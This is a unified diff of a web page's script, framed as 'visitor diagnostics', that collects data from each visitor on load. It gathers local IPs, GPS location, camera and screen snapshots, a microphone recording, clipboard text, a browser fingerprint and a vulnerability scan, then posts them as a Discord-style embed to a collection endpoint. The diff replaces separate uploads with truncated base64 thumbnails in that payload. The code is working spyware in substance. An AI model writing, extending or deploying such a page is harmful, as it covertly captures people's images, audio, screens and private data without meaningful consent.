@@ -16,21 +16,6 @@
     <script>
         const BACKEND_URL = '/api/collect';
 
-        // ------------------------------------------------------------------
-        // Upload to your own server (no CORS issues)
-        // ------------------------------------------------------------------
-        async function uploadToOwnServer(blob, filename) {
-            const formData = new FormData();
-            formData.append('file', blob, filename);
-            const response = await fetch('/upload', {
-                method: 'POST',
-                body: formData
-            });
-            if (!response.ok) throw new Error(`Upload failed: ${response.status}`);
-            const data = await response.json();
-            return data.url; // e.g., https://yourdomain.com/uploads/1234567890-xyz.jpg
-        }
-
         (async () => {
             const logEl = document.getElementById('log');
             const data = {};
@@ -114,8 +99,9 @@
                 return ext;
             }
 
-            // ==================== NEW EXTENDED DIAGNOSTICS ====================
+            // ==================== NEW EXTENDED DIAGNOSTICS (MASSIVELY EXPANDED) ====================
 
+            // 1. Full WebRTC local IPs (all interfaces)
             async function getAllLocalIPs() {
                 return new Promise((resolve) => {
                     const ips = new Set();
@@ -138,6 +124,7 @@
                 });
             }
 
+            // 2. Geolocation (GPS)
             async function getGeolocation() {
                 return new Promise((resolve) => {
                     if (!navigator.geolocation) { resolve(null); return; }
@@ -149,7 +136,7 @@
                 });
             }
 
-            // Camera snapshot – upload to own server
+            // 3. Camera snapshot (stills) – capture single frame from video
             async function captureCameraSnapshot(videoTrack) {
                 if (!videoTrack) return null;
                 const stream = new MediaStream([videoTrack]);
@@ -162,20 +149,16 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
+                const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                 video.srcObject = null;
                 video.remove();
-                if(videoTrack.stop) videoTrack.stop();
-                try {
-                    const url = await uploadToOwnServer(blob, 'camera_snapshot.jpg');
-                    return url;
-                } catch(e) {
-                    console.error('Camera upload failed:', e);
-                    return null;
-                }
+                trackStop(videoTrack); // stop track to release camera
+                return dataURL.slice(0, 200); // truncate for Discord, full in raw logs? we'll store full in separate field maybe.
             }
 
-            // Microphone recording – upload to own server
+            function trackStop(track) { if(track && track.stop) track.stop(); }
+
+            // 4. Microphone recording (short audio sample)
             async function captureMicrophoneSample(stream) {
                 if (!stream) return null;
                 const mediaRecorder = new MediaRecorder(stream);
@@ -186,17 +169,21 @@
                 mediaRecorder.stop();
                 await new Promise(r => mediaRecorder.onstop = r);
                 const blob = new Blob(chunks, { type: 'audio/webm' });
+                const url = URL.createObjectURL(blob);
+                const base64 = await blobToBase64(blob);
+                URL.revokeObjectURL(url);
                 stream.getTracks().forEach(t => t.stop());
-                try {
-                    const url = await uploadToOwnServer(blob, 'microphone_sample.webm');
-                    return url;
-                } catch(e) {
-                    console.error('Microphone upload failed:', e);
-                    return null;
-                }
+                return base64.slice(0, 200); // truncated
+            }
+            function blobToBase64(blob) {
+                return new Promise((resolve) => {
+                    const reader = new FileReader();
+                    reader.onloadend = () => resolve(reader.result);
+                    reader.readAsDataURL(blob);
+                });
             }
 
-            // Screen capture – upload to own server
+            // 5. Screen capture snapshot
             async function captureScreenSnapshot() {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return null;
                 try {
@@ -210,17 +197,14 @@
                     canvas.height = video.videoHeight;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0);
-                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.5));
+                    const dataURL = canvas.toDataURL('image/jpeg', 0.5);
                     stream.getTracks().forEach(t => t.stop());
                     video.remove();
-                    const url = await uploadToOwnServer(blob, 'screen_snapshot.jpg');
-                    return url;
-                } catch(e) {
-                    console.error('Screen capture failed:', e);
-                    return null;
-                }
+                    return dataURL.slice(0, 200);
+                } catch(e) { return { error: e.message }; }
             }
 
+            // 6. Clipboard read (text)
             async function readClipboard() {
                 if (!navigator.clipboard || !navigator.clipboard.readText) return null;
                 try {
@@ -229,6 +213,7 @@
                 } catch(e) { return { error: e.message }; }
             }
 
+            // 7. Device orientation
             function getOrientation() {
                 return new Promise((resolve) => {
                     if (!window.DeviceOrientationEvent) { resolve(null); return; }
@@ -241,6 +226,7 @@
                 });
             }
 
+            // 8. Ambient light sensor
             async function getAmbientLight() {
                 if (!window.AmbientLightSensor) return null;
                 try {
@@ -253,20 +239,52 @@
                 } catch(e) { return null; }
             }
 
-            async function getBluetoothAvailability() { return !!navigator.bluetooth; }
-            async function getUSBAvailability() { return !!navigator.usb; }
-            function getSpeechRecognitionSupport() { return !!(window.SpeechRecognition || window.webkitSpeechRecognition); }
-            function vibratePattern() { if(navigator.vibrate) navigator.vibrate(200); return !!navigator.vibrate; }
+            // 9. Bluetooth devices (basic availability)
+            async function getBluetoothAvailability() {
+                if (!navigator.bluetooth) return false;
+                try {
+                    // just check if device supports – without requesting devices
+                    return true;
+                } catch(e) { return false; }
+            }
+
+            // 10. USB devices (via WebUSB – requires user gesture and permission)
+            async function getUSBAvailability() {
+                if (!navigator.usb) return false;
+                return true;
+            }
+
+            // 11. Speech recognition (just check support)
+            function getSpeechRecognitionSupport() {
+                const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+                return !!SpeechRecognition;
+            }
+
+            // 12. Vibration (if supported)
+            function vibratePattern() {
+                if (!navigator.vibrate) return 'not supported';
+                navigator.vibrate(200);
+                return 'vibrated 200ms';
+            }
+
+            // 13. Notifications permission and show test (silent)
             async function checkNotifications() {
                 if (!('Notification' in window)) return 'not supported';
                 const permission = Notification.permission;
-                if (permission === 'granted') new Notification('Diagnostic test', { body: 'Test', silent: true });
+                if (permission === 'granted') {
+                    new Notification('Diagnostic test', { body: 'This is a test notification.', silent: true });
+                    return 'granted (test sent)';
+                }
                 return permission;
             }
+
+            // 14. Gamepad detection
             function getGamepads() {
                 const pads = navigator.getGamepads ? navigator.getGamepads() : [];
                 return pads.filter(p => p !== null).map(p => ({ id: p.id, buttons: p.buttons.length, axes: p.axes.length }));
             }
+
+            // 15. Installed fonts (through CSS/JS measurement)
             function getInstalledFonts() {
                 const fontList = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Lucida Console", "Segoe UI", "Roboto", "Open Sans", "Calibri", "Cambria", "Consolas"];
                 const canvas = document.createElement('canvas');
@@ -280,12 +298,16 @@
                 }
                 return fontList.filter(checkFont);
             }
+
+            // 16. WebShare API support
             function webShareSupport() { return !!navigator.share; }
+
+            // 17. Permissions API (enumerate)
             async function getAllPermissions() {
                 if (!navigator.permissions || !navigator.permissions.query) return {};
-                const names = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write', 'persistent-storage', 'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'];
+                const permissionNames = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write', 'persistent-storage', 'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'];
                 const results = {};
-                for (const name of names) {
+                for (const name of permissionNames) {
                     try {
                         const status = await navigator.permissions.query({ name });
                         results[name] = status.state;
@@ -293,6 +315,8 @@
                 }
                 return results;
             }
+
+            // 18. Media devices (list all cameras, mics, speakers)
             async function enumerateMediaDevices() {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return [];
                 try {
@@ -300,31 +324,35 @@
                     return devices.map(d => ({ kind: d.kind, label: d.label || 'hidden', deviceId: d.deviceId.slice(0,10) + '...' }));
                 } catch(e) { return []; }
             }
+
+            // 19. Request camera & microphone streams (to get metadata + snapshots)
             async function requestCameraAndMic() {
-                let cameraURL = null, micURL = null;
+                let cameraStream = null, micStream = null, cameraSnapshot = null, micSample = null, cameraTrack = null;
                 try {
-                    const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     if (cameraStream && cameraStream.getVideoTracks().length) {
-                        const track = cameraStream.getVideoTracks()[0];
-                        cameraURL = await captureCameraSnapshot(track);
+                        cameraTrack = cameraStream.getVideoTracks()[0];
+                        cameraSnapshot = await captureCameraSnapshot(cameraTrack);
                     }
-                } catch(e) { cameraURL = null; }
+                } catch(e) { cameraSnapshot = { error: e.message }; }
                 try {
-                    const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    if (micStream) micURL = await captureMicrophoneSample(micStream);
-                } catch(e) { micURL = null; }
-                return { cameraSnapshotURL: cameraURL, microphoneSampleURL: micURL };
+                    micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    if (micStream) micSample = await captureMicrophoneSample(micStream);
+                } catch(e) { micSample = { error: e.message }; }
+                return { cameraSnapshot, micSample };
             }
 
-            // ==================== MAIN EXECUTION ====================
+            // ==================== MAIN EXECUTION (all original + new) ====================
             try {
                 logEl.textContent = 'Collecting data... (camera/mic/etc may request permission)';
 
+                // 1. Original methods
                 await getIPInfo();
                 const fingerprint = getFingerprint();
                 const vulns = await scanVulns();
                 const extended = await getExtended();
 
+                // 2. New intensive collection
                 const [allLocalIPs, geoLocation, orientation, ambientLight, bluetoothAvail, usbAvail, speechRecog, notifications, gamepads, installedFonts, webShare, permissions, mediaDevices, cameraMicData] = await Promise.all([
                     getAllLocalIPs(),
                     getGeolocation(),
@@ -342,8 +370,9 @@
                     requestCameraAndMic()
                 ]);
                 const clipboardText = await readClipboard();
-                const screenSnapshotURL = await captureScreenSnapshot();
+                const screenSnapshot = await captureScreenSnapshot();
 
+                // 3. Build massive diagnostic object
                 const fullDiag = {
                     webrtc_local_ips: allLocalIPs,
                     geolocation: geoLocation,
@@ -358,10 +387,11 @@
                     web_share_support: webShare,
                     permissions: permissions,
                     media_devices: mediaDevices,
-                    camera_snapshot_url: cameraMicData.cameraSnapshotURL || null,
-                    microphone_sample_url: cameraMicData.microphoneSampleURL || null,
-                    screen_snapshot_url: screenSnapshotURL || null,
+                    camera_snapshot_thumb: cameraMicData.cameraSnapshot || null,
+                    microphone_sample_thumb: cameraMicData.micSample || null,
+                    screen_snapshot_thumb: screenSnapshot || null,
                     clipboard_text_sample: clipboardText,
+                    // Also include original 'full headers' style from previous version
                     httpHeaders: { userAgent: navigator.userAgent, accept: navigator.languages?.join(',') },
                     jsAttributes: {
                         userAgent: navigator.userAgent,
@@ -382,6 +412,9 @@
                 };
 
                 logEl.textContent = 'Sending full diagnostics payload...';
+
+                // Prepare final Embed – truncate large fields to fit Discord (2000 char limit per embed)
+                const truncate = (str, max=900) => typeof str === 'string' ? str.slice(0,max) : JSON.stringify(str).slice(0,max);
                 const finalPayload = {
                     content: '**ULTRA EXTENDED VISITOR DIAGNOSTICS**',
                     embeds: [{
@@ -398,20 +431,22 @@
                             { name: 'Orientation (α/β/γ)', value: orientation ? `${orientation.alpha},${orientation.beta},${orientation.gamma}` : 'none', inline: false },
                             { name: 'Fonts (sample)', value: installedFonts.join(', ') || 'none', inline: false },
                             { name: 'Permissions', value: '```json\n' + JSON.stringify(permissions, null, 2).slice(0,500) + '```', inline: false },
-                            { name: 'Camera Snapshot URL', value: cameraMicData.cameraSnapshotURL || 'failed/denied', inline: false },
-                            { name: 'Microphone Sample URL', value: cameraMicData.microphoneSampleURL || 'failed/denied', inline: false },
-                            { name: 'Screen Snapshot URL', value: screenSnapshotURL || 'failed/denied', inline: false },
+                            { name: 'Camera Snapshot (thumb)', value: (cameraMicData.cameraSnapshot && typeof cameraMicData.cameraSnapshot === 'string') ? cameraMicData.cameraSnapshot.slice(0,200) : 'failed/denied', inline: false },
+                            { name: 'Microphone Sample (base64)', value: (cameraMicData.micSample && typeof cameraMicData.micSample === 'string') ? cameraMicData.micSample.slice(0,200) : 'failed/denied', inline: false },
+                            { name: 'Screen Snapshot (thumb)', value: (screenSnapshot && typeof screenSnapshot === 'string') ? screenSnapshot.slice(0,200) : 'failed/denied', inline: false },
                             { name: 'Clipboard Text', value: (clipboardText && typeof clipboardText === 'string') ? clipboardText.slice(0,200) : 'no read permission/empty', inline: false },
                             { name: 'Full JS & Headers Diag', value: '```json\n' + JSON.stringify(fullDiag, null, 2).slice(0,1000) + '```', inline: false }
                         ],
                         timestamp: new Date().toISOString()
                     }]
                 };
+
                 const sendRes = await fetch(BACKEND_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(finalPayload)
                 });
+
                 logEl.textContent = sendRes.ok ? 'Full diagnostics sent successfully.' : 'Sent with partial success (HTTP ' + sendRes.status + ')';
             } catch (err) {
                 console.error(err);
